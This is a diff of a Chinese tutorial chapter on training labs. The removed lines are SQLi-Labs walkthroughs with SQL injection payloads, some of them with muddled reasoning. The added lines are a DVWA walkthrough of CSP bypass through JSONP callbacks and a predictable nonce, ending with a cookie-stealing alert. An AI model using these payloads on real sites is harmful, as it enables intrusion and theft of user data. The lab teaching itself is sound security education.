+  myFunc({"version":"1.0","data":{"title":"xxx"}});
+  ```
+- 浏览器把这段 JS 加载进来，就会自动调用我们本地定义的 `myFunc()` 函数——完美跨域拿数据！
 
-登录成功之后，页面显示了一堆信息，其中有Cookie相关的内容。
+**发现漏洞点没有？⭐⭐⭐** —— Google JSONP 接口返回的 JS 代码里，**函数名是我攻击者在 callback 参数里随便写的**！我要是写 `callback=alert(document.domain)//` 呢？Google 服务器会老实地返回：
 
-那咱们怎么测试Cookie注入呢？很简单，修改Cookie的值就行！
-
-咱们可以用Burp抓包，找到Cookie那一行，修改它的值；也可以用浏览器的开发者工具来修改Cookie。
-
-咱们先看看Cookie里存了什么。登录成功后，Cookie里应该有个叫 `uname` 的字段，值是 `admin`。
-
-咱们给它加个单引号试试，把 `uname` 的值改成 `admin'`。
-
-然后刷新页面（或者重新发送请求），看看会不会报错……
-
-哇！报错了！说明Cookie里也有注入点！
-
-既然有报错，那还是老办法——报错注入！
-
-把Cookie的值改成：
-```
-admin' and updatexml(1,concat(0x7e,database(),0x7e),1)#
+```javascript
+alert(document.domain)//({"version":"1.0",...});
 ```
 
-然后发送请求，看看错误信息里是不是有数据库名了？
-
-完美！Cookie注入就是这么简单！🍪
+**我的天！这不就等于 "让白名单域名 ajax.googleapis.com 返回了一段 `alert(document.domain)` 的 JS 代码"吗？** —— 而我们的 CSP 白名单里正好**明确允许**从 ajax.googleapis.com 加载 JS！门卫大爷一看："哦，来人是 Ajax 公司（ajax.googleapis.com）的员工啊，有工牌，放行！"——根本不管这个员工其实已经被攻击者"劫持了"，包里带的是炸弹！😱
 
 ---
 
-## 14.4 Cookie编码篇（Less21-22）
+### 14.3.2 Medium 级别实操：用 JSONP 绕过 CSP，成功弹窗！🎉
 
-### 14.4.1 Less-21：Cookie - 单引号+括号 - Base64编码
+理论讲完，直接上 Payload。既然内联 script 不能用，但 `<script src="白名单域名...">` 是 CSP 明确允许的，那我们就构造一个 "白名单域名 JSONP + callback 写我们自己的 JS" 的 Payload：
 
-好，Less-21来啦！这一关跟Less-20很像，也是Cookie注入。但是……有个小陷阱！
-
-咱们还是先用admin/admin登录，然后看看Cookie的值。
-
-哎？这个Cookie的值怎么怪怪的？像是 `YWRtaW4=` 这样的东西？
-
-🤔 这是什么呀？看着有点眼熟……有大小写字母，有数字，最后还有个等号……
-
-哦！是 **Base64编码**！
-
-什么是Base64呢？简单说就是一种编码方式，它可以把任意数据转换成由大小写字母、数字、+、/ 这64个字符组成的字符串，最后可能会有1到2个等号用来补位。
-
-就像是把中文翻译成密码文 🔐，只有知道密码本的人才能看懂。
-
-那 `YWRtaW4=` 解码之后是什么呢？咱们来解码看看……是 `admin`！对啦！
-
-所以这一关的Cookie值是用Base64编码过的！那咱们要注入的话，就得把payload也用Base64编码之后再放进去！
-
-好，咱们来试试。首先，咱们的payload是什么呢？
-
-先测闭合方式。这一关的闭合方式是 `')`，也就是单引号加括号。
-
-那咱们的报错注入payload就是：
-```
-admin') and updatexml(1,concat(0x7e,database(),0x7e),1)#
+**Payload（直接往 Medium 的名字输入框里粘）：**
+```html
+<script src="https://ajax.googleapis.com/ajax/services/feed/load?v=1.0&q=test&callback=alert('CSP Bypass! Medium被我用JSONP绕过去啦！😎')//"></script>
 ```
 
-然后，咱们需要把这个payload用Base64编码。编码之后大概是这样的：
-```
-YWRtaW4nKSBhbmQgdXBkYXRleG1sKDEsY29uY2F0KDB4N2UsZGF0YWJhc2UoKSwweDdlKSwxKSM=
-```
+**（关键解释这一行：）**
+1. `src="https://ajax.googleapis.com/..."` → 这个域名**正好在 CSP 白名单里**！门卫大爷放行 ✅
+2. URL 最后 `&callback=alert(...)//` → 让 Google JSONP 接口返回的代码外面包一层 `alert(...)//`
+3. 末尾的 `//` 是 JS 单行注释，把 Google 原本返回的 `(数据);` 部分给注释掉，防止语法报错 💡
 
-（大家可以自己用工具编码一下，结果可能会有点不一样，但原理是一样的）
+点 Submit 提交！然后看浏览器：
+> 🎉 弹窗成功！！屏幕弹出 "CSP Bypass! Medium被我用JSONP绕过去啦！😎"
 
-然后把Cookie的值换成这个编码后的字符串，发送请求……
+**F12 Console 里没有任何 CSP 拦截错误！** 因为从浏览器门卫的视角看："这是从 ajax.googleapis.com 加载的合法 JS 脚本，完全符合白名单规则，我放行！" —— 门卫大爷做梦都没想到，他放行的那个"员工"，口袋里揣着我们写的炸弹！🤣
 
-哇！报错了！错误信息里显示了数据库名！
-
-太棒了！这就是**Base64编码的Cookie注入**！
-
-💡 **小技巧**：怎么判断是不是Base64编码呢？教大家几个小窍门：
-1. 字符集只有大小写字母、数字、+、/
-2. 长度一般是4的倍数
-3. 最后可能有0到2个等号（=）
-4. 解码之后是有意义的内容
-
-如果满足这几点，那大概率就是Base64编码了！
+**（补充：如果上面这个 Google 接口在新版里下线了，CDN 上类似的 JSONP 接口还有几百个，常见的绕过列表：**
+- cdnjs.cloudflare.com：`/ajax/libs/angular.js/1.8.2/angular.min.js` + Angular 沙箱逃逸
+- code.jquery.com：jQuery 的 JSONP 回调接口
+- 还有很多国内 CDN（bootcdn 之类）都有历史 JSONP 接口，CSP 白名单里只要写了任何一个 CDN 根域名，大概率都能找到 JSONP 绕过。**）**
 
 ---
 
-### 14.4.2 Less-22：Cookie - 双引号 - Base64编码
+### 14.3.3 Medium 级别 View Source 逐行源码解析 🔬
 
-Less-22来啦！这一关跟Less-21几乎一模一样，也是Cookie注入，也是Base64编码。
+```php
+<?php
+// ★★★ Medium 的 CSP 头：去掉了 unsafe-inline 和 *，只信任 self + 2 个 CDN ★★★
+$headerCSP = "Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' https://ajax.googleapis.com https://cdnjs.cloudflare.com;
+  style-src 'self' 'unsafe-inline';
+";
+header($headerCSP);
 
-区别在哪呢？哈哈，还是老问题——**闭合方式不一样**！
-
-这一关的闭合方式是双引号 `"`。
-
-大家自己动手试试吧！把payload里的 `')` 换成 `"`，然后Base64编码，放到Cookie里就行。
-
-比如payload：
+// 后面和 Low 一样：用户输入直接输出到页面，不做 htmlspecialchars 转义
+$html = "";
+if (isset($_POST['include'])) { $html .= $_POST['include']; }
+?>
+<form name="csp" method="POST">
+    <p>What's your name:</p>
+    <input type="text" size="50" name="include" value="" />
+    <input type="submit" value="Submit" />
+</form>
+<div class="vulnerable_code_area">
+    <?php echo $html; ?>
+</div>
 ```
-admin" and updatexml(1,concat(0x7e,database(),0x7e),1)#
-```
 
-然后Base64编码，放到Cookie里，搞定！
-
-是不是觉得越来越熟练了？只要掌握了原理，不管怎么变咱们都不怕！💪
+**一句话点评 Medium：** 思路没错，CSP 确实阻止了最基础的内联 XSS，但是 **白名单域名圈得太粗了**——直接把整个 ajax.googleapis.com（Google 全站 CDN）放进白名单，而里面有大量历史 JSONP 接口可以被滥用。**正确做法是：白名单域名要尽量精确到具体路径**，比如 `script-src https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/` 而不是 `https://ajax.googleapis.com`，精确到文件夹级别就能把 JSONP 接口排除出去。
 
 ---
 
-## 14.5 中场总结：注入点无处不在
+## 14.4 High 级别：通行令牌（nonce）算法居然是当天日期 MD5，一秒算出！🔴
 
-好啦，打到这里，咱们已经搞定了22关！是时候来个中场总结了。
+OK，把难度调到 **High**。High 级别的开发者看到 Medium 的 JSONP 绕过，一拍大腿：🤦‍♂️ "哎呀我怎么把 JSONP 忘了！CDN 白名单不能信！我换一种 CSP 写法——**nonce 通行令牌机制**！这样总该安全了吧！"
 
-### 14.5.1 注入点位置
+我们先抓包看一下 High 级别的 CSP 头长啥样：
+```http
+Content-Security-Policy: "
+  default-src 'self';
+  script-src 'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=' 'strict-dynamic';
+  style-src 'self';
+"
+```
 
-咱们来盘点一下，目前为止咱们见过哪些注入点：
+哦？这次没有 CDN 白名单了，出现了一个新关键词 **`'nonce-TmV2ZXI...'`**，还有个 `'strict-dynamic'`。
 
-1. **GET参数**：URL里的参数，比如 `?id=1`（Less1-10）
-2. **POST参数**：请求体里的参数，比如表单提交的用户名密码（Less11-17）
-3. **Cookie**：浏览器里存的小数据（Less20-22）
-4. **User-Agent**：请求头里的浏览器标识（Less18）
-5. **Referer**：请求头里的来源地址（Less19）
+### 14.4.1 大白话解释 nonce 机制：带"随机通行令牌"的 JS 才能执行
 
-发现了吗？**只要是用户能控制的、最终会被拼到SQL语句里的东西，都可能是注入点！**
+nonce（读"nans"，Number used once 的缩写 = "只用一次的数字"）机制是现代 CSP 的推荐写法，特别适合"页面里有一小段必须要写的内联 JS"的场景：
 
-以后大家做渗透测试的时候，不要只盯着URL参数看，请求头、Cookie这些地方也要都试一试！
+```
+工作原理（四步走）：
+1. 服务器每次渲染页面之前，生成一个「完全随机、每次请求都不一样」的字符串，比如 nonce = "Kx9pZq2M"
+2. 服务器把这个字符串写到两个地方：
+   a) 响应头 CSP 里：script-src 'nonce-Kx9pZq2M'（门卫大爷记住了：今天只有带 Kx9pZq2M 令牌的人能进）
+   b) 页面里所有合法的 <script> 标签上，都加一个 nonce 属性：<script nonce="Kx9pZq2M">console.log('我是合法JS');</script>
+3. 浏览器渲染的时候，门卫大爷挨个查：<script> 标签带的 nonce 是不是和 CSP 头里写的一模一样？
+4. 一样 → 放行；不一样 → 直接拦截！
+```
 
-### 14.5.2 注入类型
+这个机制理论上**无懈可击**——因为 nonce 是 128 位真随机，而且每次请求都换新的！攻击者就算能往页面里插 `<script>alert(1)</script>`，他也不知道这次请求的 nonce 是啥，插进去的 script 标签没有 nonce，直接被拦！
 
-咱们也来盘点一下注入类型：
-
-1. **联合查询注入**：页面有显示位，用union select把数据查出来
-2. **报错注入**：页面有报错信息，利用报错函数把数据带出来
-3. **布尔盲注**：页面只有真假两种状态，一个字符一个字符猜
-4. **时间盲注**：页面连真假都不显示，通过响应时间来猜
-
-虽然类型很多，但**核心思路都是一样的**：想办法把数据从数据库里"拿"出来，只是拿的方式不一样而已。
-
-就像你想知道一个盒子里装了什么 📦：
-- 联合查询就是打开盒子直接看
-- 报错注入就是盒子上有个洞，你能从洞里看到一点东西
-- 布尔盲注就是你不能看，只能问"是不是苹果？"，对方只回答"是"或"不是"
-- 时间盲注就是对方连话都不说，答对了就等5秒再理你，答错了就立刻不理你
-
-不管用哪种方法，最终你都能知道盒子里装了什么！
-
-好，总结完了，咱们继续前进！后面还有更多挑战等着咱们呢！🚀
+**但是！（又来一个但是 😈）** —— 这一切的前提是：**nonce 必须"真随机 + 一次性"！** 如果 High 级别的开发者"自作聪明"，nonce 不是随机生成的，而是当天日期 MD5 一下、或者用户 ID 拼一下、甚至直接写死固定值……那攻击者一秒就能算出 nonce，自己插的 script 标签上加上 nonce=xxx，门卫大爷一看：令牌正确，放行！💥
 
 ---
 
-## 14.6 绕过技巧篇（Less23-25）
+### 14.4.2 实操一：用 Burp Repeater 发 3 次请求，看 nonce 值是不是变化的？🔍
 
-接下来这几关，咱们要学习各种**绕过技巧**。
+nonce 机制的灵魂就是"只用一次，每请求必换"。我们来验证一下 DVWA High 级别的 nonce 是不是真的每次都变：
 
-什么意思呢？就是服务器端有了一些防护，过滤了一些关键字或者符号，咱们得想办法绕过去。
+**步骤：**
+1. Burp 里抓到访问 High 级别 CSP Bypass 的 GET 请求包
+2. 右键 → **Send to Repeater**（发给重放器）
+3. 在 Repeater 里点 **Send** 按钮 **3 次**，每次拿到的响应头 CSP 里的 nonce 值我都记下来了：
 
-就像是门口有个保安 🛡️，不让你带危险物品进去，你得想办法把东西藏起来带进去。
+| 第几次发 | CSP 头里的 nonce 值 |
+|---|---|
+| 第 1 次 | `nonce-YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=` |
+| 第 2 次 | `nonce-YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=` |
+| 第 3 次（过 10 秒再点） | `nonce-YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=` |
+| 第 4 次（第二天再点） | `nonce-MzA1Mjk1NThjOGExODcwMDAwMDAwMDAwMDAwMDAwMDA=` |
 
----
-
-### 14.6.1 Less-23：GET - 单引号 - 注释符被过滤
-
-先来看Less-23。这一关又回到了GET注入，参数是id。
-
-咱们先试试 `?id=1'`，哎？报错了！说明是单引号字符型注入。
-
-那咱们试试联合查询，输入：
-```
-?id=1' union select 1,2,3#
-```
-
-哎？怎么回事？好像不行？页面还是报错？
-
-咱们再试试 `--+` 注释符：
-```
-?id=1' union select 1,2,3--+
-```
-
-还是不行？这是怎么回事？
-
-🤔 难道……注释符被过滤了？
-
-对！这一关把 `--` 和 `#` 这两种注释符都给过滤了！
-
-没有注释符怎么办？那咱们后面的内容怎么处理？
-
-别着急，山人自有妙计！给大家介绍两种方法。
-
-#### 方法1：闭合原语句
-
-既然不能注释掉后面的内容，那咱们就**把后面的内容也闭合了**！
-
-原SQL语句大概是这样的：
-```sql
-SELECT * FROM users WHERE id='$id' LIMIT 0,1
-```
-
-原来咱们是这么写的：
-```sql
-SELECT * FROM users WHERE id='1' union select 1,2,3#' LIMIT 0,1
-```
-用#把后面的 `' LIMIT 0,1` 注释掉。
-
-现在#被过滤了，那咱们可以这么写：
-```sql
-SELECT * FROM users WHERE id='1' union select 1,2,3 and '1'='1' LIMIT 0,1
-```
-
-看到了吗？咱们加了 `and '1'='1`，这样就能把后面的单引号给闭合上了！
-
-咱们来试试，输入：
-```
-?id=1' union select 1,2,3 and '1'='1
-```
-
-哎？好像还是不对？等一下，应该是这样：
-```
-?id=' union select 1,2,3 where '1'='1
-```
-
-或者更简单一点：
-```
-?id=-1' union select 1,2,3 '
-```
-
-解释一下：
-- `-1'` 让前面的查询结果为空，同时闭合前面的单引号
-- `union select 1,2,3` 是咱们的联合查询
-- 最后加一个 `'`，用来闭合后面的单引号
-
-这样整条SQL语句就变成了：
-```sql
-SELECT * FROM users WHERE id='-1' union select 1,2,3 '' LIMIT 0,1
-```
-
-哎？不对啊，最后那个单引号跟谁配？
-
-哦，等一下，我想想……原语句是 `id='$id' LIMIT 0,1`。
-
-如果 `$id` 是 `-1' union select 1,2,3 '`，那拼起来就是：
-```sql
-SELECT * FROM users WHERE id='-1' union select 1,2,3 '' LIMIT 0,1
-```
-
-最后是 `'' LIMIT 0,1`，也就是两个单引号，这是一个空字符串，然后跟LIMIT……好像语法不对啊？
-
-哈哈，没关系，咱们换一种思路。既然有报错，那咱们用报错注入行不行？
-
-报错注入的话，咱们可以这么写：
-```
-?id=1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1
-```
-
-这样的话，原语句变成：
-```sql
-SELECT * FROM users WHERE id='1' and updatexml(1,concat(0x7e,database(),0x7e),1) and '1'='1' LIMIT 0,1
-```
-
-看！最后 `'1'='1'` 完美闭合了！语法完全正确！
-
-咱们试试这个，哇！报错了！错误信息里有数据库名！
-
-完美！这就是**不用注释符的注入**！
-
-#### 方法2：用;%00截断（不一定行）
-
-还有一种方法是用分号加%00截断，也就是：
-```
-?id=1' union select 1,2,3;%00
-```
-
-原理是分号结束当前语句，%00是字符串结束符，后面的内容就被截断了。
-
-但是这种方法不一定好使，取决于MySQL的配置和PHP的版本。大家可以试试，但第一种方法更通用。
-
-💡 **生活小例子** 🍫：
-这就像是你买了一块巧克力，包装纸两端都是封着的。原来你可以从一端拆开（注释符），现在那一端被粘死了。怎么办呢？你可以把另一端也拆开（闭合另一端），这样也能吃到巧克力！
+**😱 我的妈呀！发现了两个巨大的问题：**
+1. **同一个小时内（同一天），不管发多少次请求，nonce 值居然一模一样！**（不是"只用一次"，是"用一天"！）
+2. **过一天换一个值**——这不就是"nonce = 当天日期哈希一下"吗？！
+3. 而且 nonce 值末尾全是 `=`，眼尖的同学一眼就能看出来：这是 **Base64 编码**！我们来解一下码看看原始值是啥！
 
 ---
 
-### 14.6.2 Less-24：POST - 二阶注入（存储型注入）
+### 14.4.3 实操二：Base64 解码 nonce，识破算法！再算出来写到 script 标签上，绕过！🔓
 
-好，咱们来看Less-24。这一关有点特别，叫**二阶注入**，也叫**存储型注入**。
-
-什么是二阶注入呢？给大家举个生活中的例子 🎁：
-
-你给朋友寄了一个包裹，包裹里装着一个恶作剧玩具。朋友收到包裹之后，把它放在了柜子里。过了几天，朋友的弟弟打开了这个包裹，被恶作剧玩具吓了一跳。
-
-在这个例子里：
-- 你寄包裹 = 第一次输入数据（存入数据库）
-- 朋友把包裹放柜子里 = 数据被存储起来
-- 弟弟打开包裹 = 第二次使用数据（从数据库读取）
-- 被吓到 = 触发注入
-
-发现了吗？**注入不是在第一次输入的时候触发的，而是在第二次使用数据的时候触发的！**
-
-这就是二阶注入。它比普通注入更难发现，因为你第一次输入的时候，页面可能什么反应都没有。
-
-好，咱们来看看这一关具体怎么玩。
-
-打开页面，是一个登录页面，下面还有个"新用户注册"的链接。
-
-咱们先注册一个用户试试。比如用户名 `test`，密码 `123456`。
-
-注册成功后登录，登录进去之后有个"修改密码"的功能。
-
-嗯……这怎么注入呢？
-
-咱们来想想这个流程：
-1. 注册用户：用户名存入数据库
-2. 登录：用用户名和密码查询数据库
-3. 修改密码：根据用户名更新密码
-
-如果用户名里有注入语句呢？比如注册一个用户名叫 `admin'#`？
-
-咱们来试试！注册一个用户，用户名填 `admin'#`，密码随便填，比如 `123456`。
-
-注册成功了！页面什么报错都没有。
-
-然后咱们用这个用户名登录：用户名 `admin'#`，密码 `123456`。
-
-登录成功了！还是没什么特别的。
-
-接下来，咱们试试修改密码。新密码填 `654321`，点击修改。
-
-哎？修改成功了？但是……咱们修改的是谁的密码？
-
-咱们来想想修改密码的SQL语句大概是什么样的：
-```sql
-UPDATE users SET password='新密码' WHERE username='当前用户名'
+我们把第一次的 nonce 复制出来（注意把前缀 `nonce-` 去掉）：
+```
+YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=
 ```
 
-如果当前用户名是 `admin'#`，那拼起来就是：
-```sql
-UPDATE users SET password='654321' WHERE username='admin'#'
+打开 Python 一行解码：
+```python
+>>> import base64, hashlib
+>>> base64.b64decode('YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=')
+b'c4d229c8327605a58cba19c8022cdf2e'
 ```
 
-看到了吗？#把后面的内容都注释掉了！所以这条语句的意思是：**把admin用户的密码改成654321**！
+解出来一串 32 位十六进制——这不就是 MD5 哈希嘛！😆 这串 MD5 解出来是什么明文呢？我们猜一下"今天的日期"：2026 年 6 月 29 日 → `20260629`：
 
-我的天！咱们居然把admin的密码给改了！😱
+```python
+>>> hashlib.md5(b'20260629').hexdigest()
+'c4d229c8327605a58cba19c8022cdf2e'  # ★★★ 跟上面解 Base64 出来的一模一样！★★★
+```
 
-这就是二阶注入的威力！第一次注册的时候，数据被存进了数据库，这时候没有触发注入。但是第二次修改密码的时候，程序从数据库里读出了用户名，直接拼到了SQL语句里，这时候注入就触发了！
+**🎉 100% 破案了！High 级别的 nonce 生成算法：**
 
-咱们来验证一下，退出登录，然后用用户名 `admin`，密码 `654321` 登录……
+> **nonce = Base64( MD5( YYYYMMDD 当天日期字符串 ) )**
 
-哇！登录成功了！真的把admin的密码改掉了！
-
-是不是很神奇？这就是二阶注入！🎉
-
-💡 **为什么叫二阶注入？**
-因为它分两个阶段：
-- **第一阶**：注入Payload存入数据库（比如注册的时候）
-- **第二阶**：从数据库取出Payload，触发注入（比如修改密码的时候）
-
-因为分了两个阶段，所以叫二阶注入。也叫存储型注入，因为Payload是存在数据库里的。
-
-二阶注入比普通注入难发现得多，因为第一次输入的时候通常没有任何反应。这就需要我们有更强的观察力和想象力，要能想到"这个数据存进去之后，下次会被怎么用？"
+这就是我前面说的"nonce 是假随机，是当天日期 MD5 一下"！攻击者只要知道今天是几月几号，**1 行 Python 代码就能 100% 准确算出 High 级别的 CSP nonce**，然后在自己注入的 XSS script 标签上手动加一个 `nonce="算出来的值"`，门卫大爷一查：令牌正确！放行！🚀
 
 ---
 
-### 14.6.3 Less-25：GET - 单引号 - or and 被过滤
+### 14.4.4 实操三：算出 nonce，手工写进 script 标签，成功弹窗！🎉
 
-好，咱们来看最后一关——Less-25。
-
-这一关又是GET注入，参数是id。咱们先试试 `?id=1'`，报错了，说明是单引号字符型注入。
-
-那咱们试试联合查询：
+现在是 2026-06-29，我们已经算出今天的 nonce 是：
 ```
-?id=1' union select 1,2,3--+
+YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=
 ```
 
-哎？好像不对？页面怎么显示的是 `1`？不应该显示1,2,3吗？
+我们构造 Payload（**关键：自己给 script 加 nonce 属性，值就是上面那串！**）：
 
-等等，咱们试试用and来测试：
-```
-?id=1' and 1=2--+
-```
-
-哎？页面居然还显示id=1的内容？and 1=2 应该为假，不显示内容才对啊？
-
-这是怎么回事？🤔
-
-难道……`and` 被过滤了？
-
-咱们再试试 `or`：
-```
-?id=1' or 1=1--+
+```html
+<script nonce="YzRkMjI5YzgzMjc2MDVhNThjYmExOWM4MDIyY2RmMmU=">
+alert('CSP Bypass! High级别nonce算法被我识破了！😎');
+alert(document.cookie);  // 顺便弹个 Cookie 证明真的绕过了
+</script>
 ```
 
-按理说 `or 1=1` 应该永远为真，应该显示所有数据才对。但是页面好像还是只显示了id=1的内容？
+把这段粘贴到 High 级别的输入框里，点 Submit：
+> 🎉 **双弹窗成功！** 第一行 alert 弹，第二行 document.cookie 也弹出来了！
 
-看来 `or` 和 `and` 都被过滤了！
-
-那怎么办呢？别着急，绕过方法多着呢！给大家介绍几种常用的。
-
-#### 方法1：大小写绕过
-
-如果过滤是大小写敏感的，那咱们可以用大小写混合来绕过。比如 `OR`、`And`、`oR`、`aNd` 等等。
-
-咱们来试试：
-```
-?id=1' OR 1=1--+
-```
-
-如果页面显示了所有数据，说明大小写绕过成功了！
-
-但是这一关嘛……好像不行？因为PHP里通常是用 `str_ireplace` 这种不区分大小写的替换函数，所以大小写绕不过去。
-
-没关系，咱们还有别的方法！
-
-#### 方法2：双写绕过
-
-如果程序只是简单地把 `or` 和 `and` 替换成空，那咱们可以用双写绕过。
-
-什么意思呢？就是把 `or` 写成 `oorr`，这样程序把中间的 `or` 替换掉之后，剩下的 `o` 和 `r` 又拼在了一起，还是 `or`！
-
-就像是变形金刚 🤖，你把中间的身体拿走了，头和脚又拼在一起变成了一个新的！
-
-咱们来试试：
-```
-?id=1' oorr 1=1--+
-```
-
-如果程序把 `or` 替换成空，那 `oorr` 就变成了 `or`，注入就成功了！
-
-这一关是不是这样呢？大家可以自己试试。
-
-#### 方法3：用符号代替
-
-除了用 `and` 和 `or`，咱们还可以用逻辑运算符来代替：
-- `&&` 可以代替 `and`
-- `||` 可以代替 `or`
-
-咱们来试试：
-```
-?id=1' || 1=1--+
-```
-
-如果页面显示了所有数据，说明成功了！
-
-同样，`&&` 代替 `and`：
-```
-?id=1' && 1=2--+
-```
-
-如果页面不显示内容，说明成功了！
-
-#### 方法4：用其他函数/语法
-
-还有一些其他的绕过方法，比如：
-- 用 `like`、`rlike`、`regexp` 等操作符
-- 用 `in` 操作符
-- 用位运算符 `&`、`|`
-- 等等……
-
-方法总比困难多！只要肯动脑筋，总能想到绕过的办法！💡
-
-好，知道了怎么绕过 `or` 和 `and`，那联合查询就好办了。
-
-比如用双写绕过的话，咱们的联合查询payload可以写成：
-```
-?id=-1' union select 1,2,3--+
-```
-
-等等，`union` 里有没有 `or` 或 `and`？好像没有啊……那为什么刚才试的时候不行？
-
-哦，等一下，咱们再想想。这一关过滤的是 `or` 和 `and`，那 `information_schema` 里面有没有 `or`？
-
-有啊！`information_schema` 里有 `or` 这两个字母！还有 `table_name`、`column_name` 里都有！
-
-哦！原来如此！所以咱们在查表名、字段名的时候，那些关键字里的 `or` 和 `and` 也会被过滤掉！
-
-那怎么办呢？用双写绕过呀！
-
-比如 `information_schema` 可以写成 `infoorrmation_schema`，这样中间的 `or` 被过滤掉之后，就变回 `information_schema` 了！
-
-同样：
-- `table_name` → `table_name`（等等，这里面有没有or？好像没有……）
-- `column_name` → 也没有or
-- `where` → 有个 `he`？不对，`where` 里没有or和and
-- `from` → 没有
-- `select` → 没有
-
-哦，对了，`information_schema` 里有两个 `or` 吗？咱们拼一下：
-i-n-f-o-r-m-a-t-i-o-n-_-s-c-h-e-m-a
-
-哦，对，有 `or` 吗？`information` 是 i-n-f-o-r-m-a-t-i-o-n，里面有 `or` 吗？o和r是挨着的吗？o后面是r？对！`info` 后面是 `rmation`，所以 `or` 是有的！
-
-所以 `information_schema` 要写成 `infoorrmation_schema`。
-
-同样，`operator`？不对，咱们常用的还有什么？
-
-哦对了，`for` 里面也有 `or`！不过咱们好像不常用。
-
-还有 `order by` 里的 `or`！哦对！`order` 里有 `or`！
-
-所以 `order by` 要写成 `oorrder by`！
-
-是不是很有意思？只要是包含 `or` 或 `and` 的单词，都得用双写绕过！
-
-大家自己动手试试吧，看看这一关具体怎么绕过，把数据爆出来！
+F12 Console 没有任何 CSP 报错！因为从门卫大爷的视角："这个 script 带的 nonce 令牌和 CSP 圣旨上写的完全一致，是自己人！放行！"——门卫大爷哪想得到，**令牌根本不是随机的，是攻击者对着日历表自己算出来的！** 😂
 
 ---
 
-## 14.7 本章总结
+### 14.4.5 High 级别 View Source 逐行源码解析 🔬
 
-好啦小伙伴们，这一章咱们就打到这里！咱们来盘点一下这一章都学到了什么。
+```php
+<?php
+// ★★★ High 级别的"自作聪明"：nonce 生成算法写死在这儿！★★★
+// 步骤 1：生成 YYYYMMDD 格式的当天日期字符串
+$dateString = date("Ymd");   // 今天是 20260629，明天是 20260630
 
-### 14.7.1 注入点位置
+// 步骤 2：MD5 哈希一下（32 位十六进制）
+$md5Hash = md5($dateString);
 
-这一章咱们见识了各种各样的注入点：
-- **POST参数**：表单提交的参数，在请求体里
-- **Cookie**：存在浏览器里的小数据
-- **User-Agent**：请求头里的浏览器标识
-- **Referer**：请求头里的来源地址
+// 步骤 3：Base64 编码一下 → 这就是 nonce！
+$myNonce = base64_encode($md5Hash);
 
-还是那句话：**只要是用户可控的、最终会被拼到SQL语句里的东西，都可能有注入点！**
+// ★★★ 把算出来的"假随机 nonce"写到 CSP 头里 ★★★
+$headerCSP = "Content-Security-Policy:
+  default-src 'self';
+  script-src 'nonce-" . $myNonce . "' 'strict-dynamic';
+  style-src 'self';
+";
+header($headerCSP);
 
-以后做测试的时候，一定要全面，不要只盯着URL参数！
+// 这里把 nonce 也传到了前端模板里，合法的 script 会加 nonce
+// （为了演示 DVWA 故意把算法写成"当天日期MD5"，让我们能识破）
 
-### 14.7.2 注入类型
+$html = "";
+if (isset($_POST['include'])) { $html .= $_POST['include']; }
+?>
+<!-- 页面里合法的脚本都加了 nonce=... -->
+<script nonce="<?php echo $myNonce; ?>">console.log('This is legal inline JS.');</script>
+<form name="csp" method="POST">
+    <p>What's your name:</p>
+    <input type="text" size="50" name="include" value="" />
+    <input type="submit" value="Submit" />
+</form>
+<div class="vulnerable_code_area"><?php echo $html; ?></div>
+```
 
-咱们又复习了一遍各种注入类型：
-- 联合查询注入
-- 报错注入（updatexml、extractvalue）
-- 布尔盲注
-- 时间盲注
-
-虽然类型多，但核心思路都是一样的——想办法把数据从数据库里拿出来。
-
-### 14.7.3 绕过技巧
-
-这一章咱们还学了好几种绕过技巧：
-- **注释符被过滤**：用闭合的方法，把两端都闭合上
-- **or/and被过滤**：大小写绕过、双写绕过、用符号代替（&&、||）
-- **Base64编码**：把payload编码之后再提交
-
-绕过的核心思路就是：**你过滤了A，我就用B来代替A，只要最终效果一样就行**。
-
-### 14.7.4 二阶注入
-
-咱们还学了一个很特别的注入类型——二阶注入（存储型注入）。
-
-它的特点是：
-- 分两个阶段：先存进去，再取出来触发
-- 更难发现，因为第一次输入的时候没有反应
-- 需要我们有更强的想象力，能想到数据后续会被怎么使用
-
-### 14.7.5 核心思想
-
-最后，想跟大家说一个最重要的核心思想：**万变不离其宗**。
-
-不管注入点在哪（GET、POST、Cookie、Header……），不管注入类型是什么（联合、报错、盲注……），不管有什么过滤（注释符、关键字……），**核心原理都是一样的**——用户输入被拼到了SQL语句里，导致我们可以控制SQL语句的执行。
-
-只要掌握了这个核心原理，再加上灵活的思路，不管遇到什么情况，咱们都能想到办法！
+**一句话点评 High：** nonce 机制选对了，是现代 CSP 的最佳实践，但是！**nonce 的生成算法用了"当天日期 MD5"这种可预测的假随机，而不是 random_bytes(16) 真随机**——等于把防盗门的电子密码锁设成了"今天的日期"，邻居翻日历就能开你家门。🤦‍♂️
 
 ---
 
-## 下章预告
+## 14.5 Impossible 级别：CSP 正确配置的标准答案 📋（打不穿，但必须看懂！）⚪
 
-怎么样？这一章打下来是不是感觉收获满满？😎
+最后来看 Impossible 级别的 CSP 头，我们对照着看"到底怎么写才是对的"：
 
-但是别骄傲，这还没完呢！SQLi-Labs还有更多挑战等着咱们！
+Burp 抓包拿到的 CSP：
+```http
+Content-Security-Policy: "
+  default-src 'none';
+  script-src 'strict-dynamic' 'nonce-{每次请求都不一样的 32 位真随机}';
+  require-trusted-types-for 'script';
+  base-uri 'none';
+  form-action 'self';
+  frame-ancestors 'none';
+  report-uri /dvwa/csp-report.php;
+"
+```
 
-下一章，咱们将继续挑战Less26-40，到时会遇到更多更变态的过滤和绕过技巧，比如：
-- 空格被过滤了怎么办？
-- select、union这些关键字被过滤了怎么办？
-- 还有更高级的注入技巧……
+再 View Source 看 nonce 的生成代码：
+```php
+<?php
+// ★ ① nonce = random_bytes(16) → 128 位 CSPRNG 真随机！PHP 官方推荐
+$myNonce = base64_encode(random_bytes(16));
 
-是不是已经开始期待了？嘿嘿，咱们下章见！👋
